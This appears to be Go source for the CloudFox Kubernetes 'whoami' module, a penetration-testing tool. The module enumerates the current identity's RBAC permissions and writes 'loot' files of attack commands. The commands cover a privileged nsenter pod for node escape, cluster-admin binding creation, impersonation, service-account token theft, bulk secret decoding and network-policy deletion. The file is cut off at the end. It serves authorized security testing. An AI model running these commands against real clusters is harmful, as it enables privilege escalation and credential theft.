package commands

import (
	"context"
	"fmt"
	"sort"
	"strings"

	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
	"github.com/BishopFox/cloudfox/kubernetes/sdk"
	attackpathservice "github.com/BishopFox/cloudfox/kubernetes/services/attackpathService"
	"github.com/BishopFox/cloudfox/kubernetes/services/clusterInfoService"
	"github.com/BishopFox/cloudfox/kubernetes/services/models"
	"github.com/BishopFox/cloudfox/kubernetes/shared"
	"github.com/spf13/cobra"
)

// Flags for whoami command
var whoamiExtended bool

// WhoamiCmd is the whoami command using the clusterInfoService
var WhoamiCmd = &cobra.Command{
	Use:     "whoami",
	Aliases: []string{"who", "identity", "me"},
	Short:   "Display current cluster identity and security context",
	Long: `Display identity context for the authenticated Kubernetes user or service account.

Default output:
- Current identity details (username, groups, service account)
- Cluster information (API server, cloud provider, version)
- RBAC role bindings (ClusterRole, ClusterRoleBinding)
- Dangerous permissions detected across namespaces

With --extended flag (adds):
- Service accounts that can be impersonated
- Privilege escalation paths (RBAC escalation, pod creation, etc.)
- Data exfiltration capabilities (secret access, logs, exec)
- Lateral movement capabilities (pod exec, service discovery)
- Exploitation commands

Detection methods used:
- SelfSubjectReview API (K8s 1.27+)
- ServiceAccount token decoding (in-cluster)
- Kubeconfig parsing
- Forbidden error parsing (fallback)

Usage:
  cloudfox kubernetes whoami
  cloudfox kubernetes whoami --extended`,
	Run: Whoami,
}

func init() {
	WhoamiCmd.Flags().BoolVarP(&whoamiExtended, "extended", "e", false, "Enable extended enumeration (impersonation targets, attack paths)")
}

// WhoamiOutput implements internal.CloudfoxOutput
type WhoamiOutput struct {
	Table []internal.TableFile
	Loot  []internal.LootFile
}

func (w WhoamiOutput) TableFiles() []internal.TableFile {
	return w.Table
}

func (w WhoamiOutput) LootFiles() []internal.LootFile {
	return w.Loot
}

// WhoamiModule holds all data for whoami analysis
type WhoamiModule struct {
	// Basic identity info from clusterInfoService
	Result *models.WhoamiResult

	// Extended mode data
	Extended          bool
	PrivEscPaths      []attackpathservice.AttackPath
	LateralPaths      []attackpathservice.AttackPath
	ExfilPaths        []attackpathservice.AttackPath
	ImpersonationInfo []ImpersonationTarget

	// Loot files
	LootFiles []internal.LootFile
}

// ImpersonationTarget represents a service account that can be impersonated
type ImpersonationTarget struct {
	Namespace      string
	ServiceAccount string
	CanImpersonate bool
	CanCreateToken bool
	Source         string // Role that grants this
}

// Whoami is the main command handler
func Whoami(cmd *cobra.Command, args []string) {
	ctx, cancel := shared.ContextWithCancel()
	defer cancel()
	logger := internal.NewLogger()

	parentCmd := cmd.Parent()

	// Get output configuration from parent flags
	verbosity, _ := parentCmd.PersistentFlags().GetInt("verbosity")
	wrap, _ := parentCmd.PersistentFlags().GetBool("wrap")
	outputDirectory, _ := parentCmd.PersistentFlags().GetString("outdir")
	format, _ := parentCmd.PersistentFlags().GetString("output")

	// Validate authentication first
	if err := sdk.ValidateAuth(ctx); err != nil {
		logger.ErrorM(fmt.Sprintf("Authentication failed:\n%v", err), globals.K8S_WHOAMI_MODULE_NAME)
		return
	}

	if whoamiExtended {
		logger.InfoM(fmt.Sprintf("Gathering comprehensive identity context for %s (extended mode)...", globals.ClusterName), globals.K8S_WHOAMI_MODULE_NAME)
	} else {
		logger.InfoM(fmt.Sprintf("Identifying current cluster identity for %s", globals.ClusterName), globals.K8S_WHOAMI_MODULE_NAME)
	}

	// Create cluster info service
	svc, err := clusterInfoService.New()
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Failed to create cluster info service: %v", err), globals.K8S_WHOAMI_MODULE_NAME)
		return
	}

	// Get comprehensive whoami result
	result, err := svc.GetWhoami(ctx)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Failed to get whoami info: %v", err), globals.K8S_WHOAMI_MODULE_NAME)
		return
	}

	module := &WhoamiModule{
		Result:   result,
		Extended: whoamiExtended,
	}

	// Log identity summary
	logger.InfoM(fmt.Sprintf("Authenticated as: %s", orUnknown(result.Identity.Username)), globals.K8S_WHOAMI_MODULE_NAME)
	logger.InfoM(fmt.Sprintf("Risk Level: %s | Dangerous Permissions: %d | Namespaces with Permissions: %d",
		result.Permissions.RiskLevel,
		result.Permissions.DangerousPermissions,
		result.Permissions.TotalNamespaces),
		globals.K8S_WHOAMI_MODULE_NAME)

	// Extended mode: Additional enumeration
	if whoamiExtended {
		// Identify privilege escalation paths
		module.identifyPrivEscPaths(ctx, logger)

		// Identify lateral movement paths
		module.identifyLateralPaths(ctx, logger)

		// Identify data exfiltration paths
		module.identifyExfilPaths(ctx, logger)

		// Identify impersonation targets
		module.identifyImpersonationTargets(logger)
	}

	// Build output tables
	tables := module.buildTables()

	// Generate loot files
	lootFiles := module.generateLoot()

	// Write output
	err = internal.HandleOutput(
		"Kubernetes",
		format,
		outputDirectory,
		verbosity,
		wrap,
		"Whoami",
		globals.ClusterName,
		"results",
		WhoamiOutput{
			Table: tables,
			Loot:  lootFiles,
		},
	)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error handling output: %v", err), globals.K8S_WHOAMI_MODULE_NAME)
		return
	}

	logger.InfoM(fmt.Sprintf("Identity enumeration complete: %s risk", result.Permissions.RiskLevel), globals.K8S_WHOAMI_MODULE_NAME)
	logger.InfoM(fmt.Sprintf("For context and next steps: https://github.com/BishopFox/cloudfox/wiki/Kubernetes-Commands#%s", globals.K8S_WHOAMI_MODULE_NAME), globals.K8S_WHOAMI_MODULE_NAME)
}

// identifyPrivEscPaths finds privilege escalation paths from current identity's permissions
func (m *WhoamiModule) identifyPrivEscPaths(ctx context.Context, logger internal.Logger) {
	// Build attack paths directly from the permissions we know this identity has
	privescPerms := attackpathservice.GetPrivescPermissions()
	permMap := make(map[string]attackpathservice.PrivescPermission)
	for _, p := range privescPerms {
		key := fmt.Sprintf("%s:%s", p.Verb, p.Resource)
		permMap[key] = p
	}

	for _, perm := range m.Result.Permissions.PermissionsWithSource {
		key := fmt.Sprintf("%s:%s", perm.Verb, perm.Resource)
		if privesc, ok := permMap[key]; ok {
			path := attackpathservice.AttackPath{
				Principal:      m.Result.Identity.Username,
				PrincipalType:  "User",
				Method:         privesc.Category,
				TargetResource: perm.Resource,
				Permissions:    []string{fmt.Sprintf("%s %s", perm.Verb, perm.Resource)},
				Category:       privesc.Category,
				RiskLevel:      privesc.RiskLevel,
				Description:    privesc.Description,
				ExploitCommand: generateWhoamiExploitCommand("privesc", perm.Verb, perm.Resource, perm.Namespace),
				Namespace:      perm.Namespace,
				ScopeType:      "namespace",
				ScopeID:        perm.Namespace,
				ScopeName:      perm.Namespace,
				PathType:       "privesc",
				RoleName:       perm.RoleName,
				BindingName:    perm.BindingName,
			}
			if perm.Namespace == "cluster-wide" {
				path.ScopeType = "cluster"
			}
			m.PrivEscPaths = append(m.PrivEscPaths, path)
		}
		// Check for wildcards
		if perm.Verb == "*" || perm.Resource == "*" {
			path := attackpathservice.AttackPath{
				Principal:      m.Result.Identity.Username,
				PrincipalType:  "User",
				Method:         "Wildcard Access",
				TargetResource: perm.Resource,
				Permissions:    []string{fmt.Sprintf("%s %s", perm.Verb, perm.Resource)},
				Category:       "Wildcard",
				RiskLevel:      "CRITICAL",
				Description:    "Wildcard permission grants excessive access",
				ExploitCommand: fmt.Sprintf("# Wildcard access: %s %s", perm.Verb, perm.Resource),
				Namespace:      perm.Namespace,
				ScopeType:      "namespace",
				ScopeID:        perm.Namespace,
				ScopeName:      perm.Namespace,
				PathType:       "privesc",
				RoleName:       perm.RoleName,
				BindingName:    perm.BindingName,
			}
			if perm.Namespace == "cluster-wide" {
				path.ScopeType = "cluster"
			}
			m.PrivEscPaths = append(m.PrivEscPaths, path)
		}
	}

	if len(m.PrivEscPaths) > 0 {
		logger.InfoM(fmt.Sprintf("[PRIVESC] Found %d privilege escalation path(s) for current identity", len(m.PrivEscPaths)), globals.K8S_WHOAMI_MODULE_NAME)
	}
}

// identifyLateralPaths finds lateral movement paths from current identity's permissions
func (m *WhoamiModule) identifyLateralPaths(ctx context.Context, logger internal.Logger) {
	lateralPerms := attackpathservice.GetLateralMovementPermissions()
	permMap := make(map[string]attackpathservice.LateralMovementPermission)
	for _, p := range lateralPerms {
		key := fmt.Sprintf("%s:%s", p.Verb, p.Resource)
		permMap[key] = p
	}

	for _, perm := range m.Result.Permissions.PermissionsWithSource {
		key := fmt.Sprintf("%s:%s", perm.Verb, perm.Resource)
		if lateral, ok := permMap[key]; ok {
			path := attackpathservice.AttackPath{
				Principal:      m.Result.Identity.Username,
				PrincipalType:  "User",
				Method:         lateral.Category,
				TargetResource: perm.Resource,
				Permissions:    []string{fmt.Sprintf("%s %s", perm.Verb, perm.Resource)},
				Category:       lateral.Category,
				RiskLevel:      lateral.RiskLevel,
				Description:    lateral.Description,
				ExploitCommand: generateWhoamiExploitCommand("lateral", perm.Verb, perm.Resource, perm.Namespace),
				Namespace:      perm.Namespace,
				ScopeType:      "namespace",
				ScopeID:        perm.Namespace,
				ScopeName:      perm.Namespace,
				PathType:       "lateral",
				RoleName:       perm.RoleName,
				BindingName:    perm.BindingName,
			}
			if perm.Namespace == "cluster-wide" {
				path.ScopeType = "cluster"
			}
			m.LateralPaths = append(m.LateralPaths, path)
		}
	}

	if len(m.LateralPaths) > 0 {
		logger.InfoM(fmt.Sprintf("[LATERAL] Found %d lateral movement path(s) for current identity", len(m.LateralPaths)), globals.K8S_WHOAMI_MODULE_NAME)
	}
}

// identifyExfilPaths finds data exfiltration paths from current identity's permissions
func (m *WhoamiModule) identifyExfilPaths(ctx context.Context, logger internal.Logger) {
	exfilPerms := attackpathservice.GetDataExfilPermissions()
	permMap := make(map[string]attackpathservice.DataExfilPermission)
	for _, p := range exfilPerms {
		key := fmt.Sprintf("%s:%s", p.Verb, p.Resource)
		permMap[key] = p
	}

	for _, perm := range m.Result.Permissions.PermissionsWithSource {
		key := fmt.Sprintf("%s:%s", perm.Verb, perm.Resource)
		if exfil, ok := permMap[key]; ok {
			path := attackpathservice.AttackPath{
				Principal:      m.Result.Identity.Username,
				PrincipalType:  "User",
				Method:         exfil.Category,
				TargetResource: perm.Resource,
				Permissions:    []string{fmt.Sprintf("%s %s", perm.Verb, perm.Resource)},
				Category:       exfil.Category,
				RiskLevel:      exfil.RiskLevel,
				Description:    exfil.Description,
				ExploitCommand: generateWhoamiExploitCommand("exfil", perm.Verb, perm.Resource, perm.Namespace),
				Namespace:      perm.Namespace,
				ScopeType:      "namespace",
				ScopeID:        perm.Namespace,
				ScopeName:      perm.Namespace,
				PathType:       "exfil",
				RoleName:       perm.RoleName,
				BindingName:    perm.BindingName,
			}
			if perm.Namespace == "cluster-wide" {
				path.ScopeType = "cluster"
			}
			m.ExfilPaths = append(m.ExfilPaths, path)
		}
	}

	if len(m.ExfilPaths) > 0 {
		logger.InfoM(fmt.Sprintf("[EXFIL] Found %d data exfiltration path(s) for current identity", len(m.ExfilPaths)), globals.K8S_WHOAMI_MODULE_NAME)
	}
}

// identifyImpersonationTargets finds service accounts that can be impersonated
func (m *WhoamiModule) identifyImpersonationTargets(logger internal.Logger) {
	// Check dangerous permissions for impersonation capabilities
	for _, perm := range m.Result.Permissions.DangerousPerms {
		if strings.Contains(perm.Reason, "impersonate") {
			// This identity can impersonate
			m.ImpersonationInfo = append(m.ImpersonationInfo, ImpersonationTarget{
				Namespace:      perm.Namespace,
				ServiceAccount: "*",
				CanImpersonate: true,
				Source:         fmt.Sprintf("%s %s", perm.Verb, perm.Resource),
			})
		}
		if strings.Contains(perm.Resource, "serviceaccounts/token") && perm.Verb == "create" {
			m.ImpersonationInfo = append(m.ImpersonationInfo, ImpersonationTarget{
				Namespace:      perm.Namespace,
				ServiceAccount: "*",
				CanCreateToken: true,
				Source:         "serviceaccounts/token create",
			})
		}
	}

	if len(m.ImpersonationInfo) > 0 {
		logger.InfoM(fmt.Sprintf("[IMPERSONATE] Found %d impersonation capability(s)", len(m.ImpersonationInfo)), globals.K8S_WHOAMI_MODULE_NAME)
	}
}

// generateWhoamiExploitCommand generates exploit commands for whoami attack paths
func generateWhoamiExploitCommand(pathType, verb, resource, namespace string) string {
	nsFlag := ""
	if namespace != "" && namespace != "cluster-wide" {
		nsFlag = fmt.Sprintf("-n %s ", namespace)
	}

	switch pathType {
	case "privesc":
		switch {
		case resource == "pods" && verb == "create":
			return fmt.Sprintf("kubectl %srun privesc --image=alpine --restart=Never --overrides='{\"spec\":{\"containers\":[{\"name\":\"privesc\",\"image\":\"alpine\",\"command\":[\"sh\",\"-c\",\"sleep 3600\"],\"securityContext\":{\"privileged\":true}}]}}' -- sleep 3600", nsFlag)
		case resource == "pods/exec":
			return fmt.Sprintf("kubectl %sexec -it <pod-name> -- /bin/sh", nsFlag)
		case resource == "clusterrolebindings" && verb == "create":
			return "kubectl create clusterrolebinding escalate --clusterrole=cluster-admin --user=<your-user>"
		case resource == "rolebindings" && verb == "create":
			return fmt.Sprintf("kubectl %screate rolebinding escalate --clusterrole=admin --user=<your-user>", nsFlag)
		case resource == "serviceaccounts/token":
			return fmt.Sprintf("kubectl %screate token <service-account-name> --duration=8760h", nsFlag)
		default:
			return fmt.Sprintf("kubectl %s%s %s", nsFlag, verb, resource)
		}
	case "lateral":
		switch {
		case resource == "pods/exec":
			return fmt.Sprintf("kubectl %sexec -it <pod-name> -- /bin/sh", nsFlag)
		case resource == "pods/portforward":
			return fmt.Sprintf("kubectl %sport-forward <pod-name> 8080:80", nsFlag)
		case resource == "secrets":
			return fmt.Sprintf("kubectl %sget secrets -o yaml", nsFlag)
		case resource == "services":
			return fmt.Sprintf("kubectl %sget services -o wide", nsFlag)
		default:
			return fmt.Sprintf("kubectl %s%s %s", nsFlag, verb, resource)
		}
	case "exfil":
		switch {
		case resource == "secrets":
			return fmt.Sprintf("kubectl %sget secrets -o json | jq '.items[].data | map_values(@base64d)'", nsFlag)
		case resource == "configmaps":
			return fmt.Sprintf("kubectl %sget configmaps -o yaml", nsFlag)
		case resource == "pods/log":
			return fmt.Sprintf("kubectl %slogs <pod-name> --all-containers", nsFlag)
		case resource == "pods/exec":
			return fmt.Sprintf("kubectl %sexec <pod-name> -- cat /etc/passwd", nsFlag)
		default:
			return fmt.Sprintf("kubectl %s%s %s", nsFlag, verb, resource)
		}
	}
	return fmt.Sprintf("kubectl %s%s %s", nsFlag, verb, resource)
}

// buildTables creates the output tables
func (m *WhoamiModule) buildTables() []internal.TableFile {
	var tables []internal.TableFile

	// Table 1: Identity (property/value format like GCP)
	identityTable := m.buildIdentityTable()
	tables = append(tables, identityTable)

	// Table 2: Permissions (if we have any permissions)
	if m.Result.Permissions.TotalNamespaces > 0 || len(m.Result.Permissions.PermissionsWithSource) > 0 {
		permTable := m.buildPermissionsTable()
		tables = append(tables, permTable)
	}

	// Extended mode tables
	if m.Extended {
		// Table 4: Attack Paths (combined privesc, lateral, exfil)
		totalPaths := len(m.PrivEscPaths) + len(m.LateralPaths) + len(m.ExfilPaths)
		if totalPaths > 0 {
			attackPathsTable := m.buildAttackPathsTable()
			tables = append(tables, attackPathsTable)
		}

		// Table 5: Impersonation Targets
		if len(m.ImpersonationInfo) > 0 {
			impersonationTable := m.buildImpersonationTable()
			tables = append(tables, impersonationTable)
		}
	}

	return tables
}

// buildIdentityTable creates the identity property/value table
func (m *WhoamiModule) buildIdentityTable() internal.TableFile {
	headers := []string{"Property", "Value"}
	var body [][]string

	// Cluster information
	body = append(body, []string{"Cluster Name", m.Result.Cluster.Name})
	body = append(body, []string{"API Server", m.Result.Cluster.APIServerURL})
	body = append(body, []string{"Cloud Provider", orUnknown(m.Result.Cluster.CloudProvider)})
	if m.Result.Cluster.Region != "" {
		body = append(body, []string{"Region", m.Result.Cluster.Region})
	}
	if m.Result.Cluster.Version != nil {
		body = append(body, []string{"K8s Version", m.Result.Cluster.Version.GitVersion})
	}

	// Identity information
	body = append(body, []string{"Username", orUnknown(m.Result.Identity.Username)})
	body = append(body, []string{"Detection Method", string(m.Result.Identity.Source)})

	// Service account info
	if m.Result.Identity.IsServiceAccount() {
		body = append(body, []string{"ServiceAccount", m.Result.Identity.FullServiceAccountName()})
		body = append(body, []string{"SA Namespace", m.Result.Identity.ServiceAccountNamespace})
		body = append(body, []string{"SA Name", m.Result.Identity.ServiceAccountName})
	}

	// Groups
	if len(m.Result.Identity.Groups) > 0 {
		for i, group := range m.Result.Identity.Groups {
			label := "Group"
			if len(m.Result.Identity.Groups) > 1 {
				label = fmt.Sprintf("Group %d", i+1)
			}
			body = append(body, []string{label, group})
		}
	} else {
		body = append(body, []string{"Groups", "None"})
	}

	// RBAC bindings
	if m.Result.Identity.ClusterRoleBinding != "" {
		body = append(body, []string{"ClusterRoleBinding", m.Result.Identity.ClusterRoleBinding})
	}
	if m.Result.Identity.ClusterRole != "" {
		body = append(body, []string{"ClusterRole", m.Result.Identity.ClusterRole})
	}

	// Risk summary
	body = append(body, []string{"Risk Level", m.Result.Permissions.RiskLevel})
	body = append(body, []string{"Dangerous Permissions", fmt.Sprintf("%d", m.Result.Permissions.DangerousPermissions)})
	body = append(body, []string{"Namespaces with Permissions", fmt.Sprintf("%d", m.Result.Permissions.TotalNamespaces)})

	// Extended mode summary
	if m.Extended {
		body = append(body, []string{"Privilege Escalation Paths", fmt.Sprintf("%d", len(m.PrivEscPaths))})
		body = append(body, []string{"Lateral Movement Paths", fmt.Sprintf("%d", len(m.LateralPaths))})
		body = append(body, []string{"Data Exfiltration Paths", fmt.Sprintf("%d", len(m.ExfilPaths))})
		body = append(body, []string{"Impersonation Capabilities", fmt.Sprintf("%d", len(m.ImpersonationInfo))})
	}

	return internal.TableFile{
		Name:   "whoami",
		Header: headers,
		Body:   body,
	}
}

// buildPermissionsTable creates the namespace permissions table with RBAC source information
func (m *WhoamiModule) buildPermissionsTable() internal.TableFile {
	headers := []string{"Namespace", "Permission", "Subject", "Role", "Binding"}

	var body [][]string

	// Use PermissionsWithSource if available (has RBAC source info)
	if len(m.Result.Permissions.PermissionsWithSource) > 0 {
		// Sort by namespace, then permission
		perms := m.Result.Permissions.PermissionsWithSource
		sort.Slice(perms, func(i, j int) bool {
			if perms[i].Namespace != perms[j].Namespace {
				return perms[i].Namespace < perms[j].Namespace
			}
			permI := fmt.Sprintf("%s %s", perms[i].Verb, perms[i].Resource)
			permJ := fmt.Sprintf("%s %s", perms[j].Verb, perms[j].Resource)
			return permI < permJ
		})

		for _, perm := range perms {
			permission := fmt.Sprintf("%s %s", perm.Verb, perm.Resource)
			if perm.APIGroup != "" && perm.APIGroup != "core" {
				permission = fmt.Sprintf("%s %s.%s", perm.Verb, perm.Resource, perm.APIGroup)
			}

			// Format subject (user, group, or serviceaccount)
			subject := formatSubject(perm.SubjectKind, perm.SubjectName, perm.SubjectNS)
			role := fmt.Sprintf("%s/%s", perm.RoleKind, perm.RoleName)
			binding := fmt.Sprintf("%s/%s", perm.BindingKind, perm.BindingName)

			body = append(body, []string{
				perm.Namespace,
				permission,
				subject,
				role,
				binding,
			})
		}
	} else {
		// Fallback to simple format without source info
		namespaces := make([]string, 0, len(m.Result.Permissions.NamespacePermissions))
		for ns := range m.Result.Permissions.NamespacePermissions {
			namespaces = append(namespaces, ns)
		}
		sort.Strings(namespaces)

		for _, ns := range namespaces {
			perms := m.Result.Permissions.NamespacePermissions[ns]
			sort.Strings(perms)

			for _, perm := range perms {
				body = append(body, []string{
					ns,
					perm,
					"",
					"",
					"",
				})
			}
		}
	}

	return internal.TableFile{
		Name:   "whoami-permissions",
		Header: headers,
		Body:   body,
	}
}

// buildAttackPathsTable creates the combined attack paths table
func (m *WhoamiModule) buildAttackPathsTable() internal.TableFile {
	headers := []string{
		"Type",
		"Scope",
		"Method",
		"Target Resource",
		"Description",
	}

	var body [][]string

	// Add privilege escalation paths
	for _, path := range m.PrivEscPaths {
		body = append(body, []string{
			"Privesc",
			path.ScopeName,
			path.Method,
			path.TargetResource,
			path.Description,
		})
	}

	// Add lateral movement paths
	for _, path := range m.LateralPaths {
		body = append(body, []string{
			"Lateral",
			path.ScopeName,
			path.Method,
			path.TargetResource,
			path.Description,
		})
	}

	// Add data exfiltration paths
	for _, path := range m.ExfilPaths {
		body = append(body, []string{
			"Exfil",
			path.ScopeName,
			path.Method,
			path.TargetResource,
			path.Description,
		})
	}

	return internal.TableFile{
		Name:   "whoami-attack-paths",
		Header: headers,
		Body:   body,
	}
}

// buildImpersonationTable creates the impersonation targets table
func (m *WhoamiModule) buildImpersonationTable() internal.TableFile {
	headers := []string{
		"Namespace",
		"Target",
		"Can Impersonate",
		"Can Create Token",
		"Source",
	}

	var body [][]string
	for _, target := range m.ImpersonationInfo {
		body = append(body, []string{
			target.Namespace,
			target.ServiceAccount,
			boolToYesNo(target.CanImpersonate),
			boolToYesNo(target.CanCreateToken),
			target.Source,
		})
	}

	return internal.TableFile{
		Name:   "whoami-impersonation",
		Header: headers,
		Body:   body,
	}
}

// generateLoot creates loot files with exploitation commands
func (m *WhoamiModule) generateLoot() []internal.LootFile {
	var lootFiles []internal.LootFile

	// RBAC Enumeration Commands (always useful)
	rbacLoot := m.generateRBACEnumLoot()
	lootFiles = append(lootFiles, internal.LootFile{
		Name:     "Whoami-RBAC-Enum",
		Contents: rbacLoot,
	})

	// Extended mode loot files with exploitation commands
	if m.Extended {
		if len(m.PrivEscPaths) > 0 {
			privescLoot := m.generatePrivescLoot()
			lootFiles = append(lootFiles, internal.LootFile{
				Name:     "Whoami-Privesc",
				Contents: privescLoot,
			})
		}

		if len(m.LateralPaths) > 0 {
			lateralLoot := m.generateLateralLoot()
			lootFiles = append(lootFiles, internal.LootFile{
				Name:     "Whoami-Lateral-Movement",
				Contents: lateralLoot,
			})
		}

		if len(m.ExfilPaths) > 0 {
			exfilLoot := m.generateExfilLoot()
			lootFiles = append(lootFiles, internal.LootFile{
				Name:     "Whoami-Data-Exfil",
				Contents: exfilLoot,
			})
		}

		if len(m.ImpersonationInfo) > 0 {
			impersonationLoot := m.generateImpersonationLoot()
			lootFiles = append(lootFiles, internal.LootFile{
				Name:     "Whoami-Impersonation",
				Contents: impersonationLoot,
			})
		}
	}

	return lootFiles
}

func (m *WhoamiModule) generatePrivescLoot() string {
	var content strings.Builder
	content.WriteString(`# Whoami - Privilege Escalation Paths
# Generated by CloudFox
# WARNING: Only use with proper authorization!

`)
	content.WriteString(fmt.Sprintf("## Found %d privilege escalation path(s)\n\n", len(m.PrivEscPaths)))

	for _, path := range m.PrivEscPaths {
		content.WriteString(fmt.Sprintf("### %s\n", path.Method))
		content.WriteString(fmt.Sprintf("# Scope: %s\n", path.ScopeName))
		content.WriteString(fmt.Sprintf("# Target: %s\n", path.TargetResource))
		content.WriteString(fmt.Sprintf("# Description: %s\n", path.Description))
		content.WriteString(fmt.Sprintf("%s\n\n", path.ExploitCommand))
	}

	// Add general exploitation techniques
	content.WriteString(`
## General Privilege Escalation Techniques

### Container Escape via Privileged Pod
# Create a privileged pod with nsenter to escape to the node
kubectl run escape-pod --image=alpine --restart=Never --overrides='{"spec":{"hostPID":true,"hostNetwork":true,"containers":[{"name":"escape","image":"alpine","command":["nsenter","--target","1","--mount","--uts","--ipc","--net","--pid","--","/bin/sh"],"stdin":true,"tty":true,"securityContext":{"privileged":true}}]}}'

### RBAC Escalation
# If you have create clusterrolebindings permission
kubectl create clusterrolebinding escalate --clusterrole=cluster-admin --serviceaccount=default:default

# If you have create rolebindings permission
kubectl create rolebinding escalate -n <namespace> --clusterrole=admin --serviceaccount=<namespace>:default

### Impersonation
# Impersonate cluster-admin
kubectl --as=system:admin get secrets -A
kubectl --as=cluster-admin get nodes

# Impersonate a service account
kubectl --as=system:serviceaccount:<namespace>:<sa-name> get secrets

### Token Generation
# Generate a long-lived token for a service account
kubectl create token <serviceaccount-name> -n <namespace> --duration=8760h

### Webhook Exploitation
# If you can create mutating webhooks, inject sidecar containers
# If you can create validating webhooks, block legitimate requests
`)

	return content.String()
}

func (m *WhoamiModule) generateLateralLoot() string {
	var content strings.Builder
	content.WriteString(`# Whoami - Lateral Movement Paths
# Generated by CloudFox
# WARNING: Only use with proper authorization!

`)
	content.WriteString(fmt.Sprintf("## Found %d lateral movement path(s)\n\n", len(m.LateralPaths)))

	for _, path := range m.LateralPaths {
		content.WriteString(fmt.Sprintf("### %s\n", path.Method))
		content.WriteString(fmt.Sprintf("# Scope: %s\n", path.ScopeName))
		content.WriteString(fmt.Sprintf("# Target: %s\n", path.TargetResource))
		content.WriteString(fmt.Sprintf("# Description: %s\n", path.Description))
		content.WriteString(fmt.Sprintf("%s\n\n", path.ExploitCommand))
	}

	// Add general lateral movement techniques
	content.WriteString(`
## General Lateral Movement Techniques

### Pod Execution
# Execute commands in a target pod
kubectl exec -it <pod-name> -n <namespace> -- /bin/bash
kubectl exec -it <pod-name> -n <namespace> -- /bin/sh

# Execute a specific command
kubectl exec <pod-name> -n <namespace> -- cat /etc/passwd

### Port Forwarding
# Forward a local port to a pod port
kubectl port-forward <pod-name> 8080:80 -n <namespace>

# Forward to a service
kubectl port-forward svc/<service-name> 8080:80 -n <namespace>

### Service Account Token Theft
# Extract SA token from a running pod
kubectl exec <pod-name> -n <namespace> -- cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Get SA tokens from secrets
kubectl get secrets -n <namespace> -o json | jq -r '.items[] | select(.type=="kubernetes.io/service-account-token") | .data.token' | base64 -d

### Service Discovery
# List all services
kubectl get services -A -o wide

# Get endpoints (direct pod IPs)
kubectl get endpoints -A

# Discover internal DNS names
kubectl exec <pod-name> -- nslookup kubernetes.default.svc.cluster.local

### Network Policy Bypass
# Delete network policies to enable lateral movement
kubectl delete networkpolicy <policy-name> -n <namespace>

# List current network policies
kubectl get networkpolicies -A
`)

	return content.String()
}

func (m *WhoamiModule) generateExfilLoot() string {
	var content strings.Builder
	content.WriteString(`# Whoami - Data Exfiltration Paths
# Generated by CloudFox
# WARNING: Only use with proper authorization!

`)
	content.WriteString(fmt.Sprintf("## Found %d data exfiltration path(s)\n\n", len(m.ExfilPaths)))

	for _, path := range m.ExfilPaths {
		content.WriteString(fmt.Sprintf("### %s\n", path.Method))
		content.WriteString(fmt.Sprintf("# Scope: %s\n", path.ScopeName))
		content.WriteString(fmt.Sprintf("# Target: %s\n", path.TargetResource))
		content.WriteString(fmt.Sprintf("# Description: %s\n", path.Description))
		content.WriteString(fmt.Sprintf("%s\n\n", path.ExploitCommand))
	}

	// Add general data exfiltration techniques
	content.WriteString(`
## General Data Exfiltration Techniques

### Secret Extraction
# Get all secrets and decode them
kubectl get secrets -A -o json | jq -r '.items[] | "\(.metadata.namespace)/\(.metadata.name): \(.data | to_entries[] | "\(.key)=\(.value | @base64d)")"'

# Decode all secrets in a namespace
kubectl get secrets -n <namespace> -o json | jq '.items[].data | map_values(@base64d)'

# Find TLS certificates
kubectl get secrets -A --field-selector type=kubernetes.io/tls -o wide

# Find docker registry credentials
kubectl get secrets -A --field-selector type=kubernetes.io/dockerconfigjson -o json | jq '.items[].data[".dockerconfigjson"]' -r | base64 -d

### ConfigMap Extraction
# Get all configmaps
kubectl get configmaps -A -o yaml

# Search for sensitive patterns in configmaps
kubectl get configmaps -A -o json | jq -r '.items[] | select(.data | to_entries[] | .value | test("password|secret|key|token"; "i"))'

### Log Extraction
# Get logs from a pod
kubectl logs <pod-name> -n <namespace> --all-containers

# Search logs for sensitive patterns
kubectl logs <pod-name> -n <namespace> | grep -iE '(password|secret|token|key|credential)'

# Get previous container logs
kubectl logs <pod-name> -n <namespace> --previous

### Data Extraction via Exec
# Extract files from containers
kubectl cp <namespace>/<pod-name>:/path/to/file ./extracted-file

# Extract environment variables
kubectl exec <pod-name> -n <namespace> -- env | grep -iE '(password|secret|token|key|credential|database|api)'

# Extract SA token from running pod
kubectl exec <pod-name> -n <namespace> -- cat /var/run/secrets/kubernetes.io/serviceaccount/token

### Token Generation for External Use
# Generate a long-lived token
kubectl create token <serviceaccount-name> -n <namespace> --duration=8760h
`)

	return content.String()
}

func (m *WhoamiModule) generateImpersonationLoot() string {
	var content strings.Builder
	content.WriteString(`# Whoami - Impersonation Capabilities
# Generated by CloudFox
# WARNING: Only use with proper authorization!

`)
	content.WriteString(fmt.Sprintf("## Found %d impersonation capability(s)\n\n", len(m.ImpersonationInfo)))

	for _, target := range m.ImpersonationInfo {
		content.WriteString(fmt.Sprintf("### Namespace: %s\n", target.Namespace))
		content.WriteString(fmt.Sprintf("# Target: %s\n", target.ServiceAccount))
		content.WriteString(fmt.Sprintf("# Source: %s\n", target.Source))

		if target.CanImpersonate {
			content.WriteString("# Can impersonate users/serviceaccounts\n")
			content.WriteString("kubectl --as=system:serviceaccount:<namespace>:<sa-name> get secrets\n")
			content.WriteString("kubectl --as=<username> get pods\n")
		}
		if target.CanCreateToken {
			content.WriteString("# Can create tokens for service accounts\n")
			content.WriteString("kubectl create token <sa-name> -n <namespace> --duration=8760h\n")
		}
		content.WriteString("\n")
	}

	return content.String()
}

func (m *WhoamiModule) generateRBACEnumLoot() string {
	identity := orUnknown(m.Result.Identity.Username)
	clusterRole := orUnknown(m.Result.Identity.ClusterRole)

	return fmt.Sprintf(`# Whoami - RBAC Enumeration
# Generated by CloudFox

## Current Identity
- Identity: %s
- ServiceAccount: %s
- Groups: %s

## RBAC Enumeration Commands

### 1. Find all ClusterRoles
kubectl get clusterroles

### 2. Find all ClusterRoleBindings
kubectl get clusterrolebindings

### 3. Find ClusterRoleBindings for your identity
kubectl get clusterrolebindings -o json | jq -r '.items[] | select(.subjects[]? | select(.name=="%s")) | .metadata.name'

### 4. Find RoleBindings across all namespaces
kubectl get rolebindings -A

### 5. Find RoleBindings for your identity
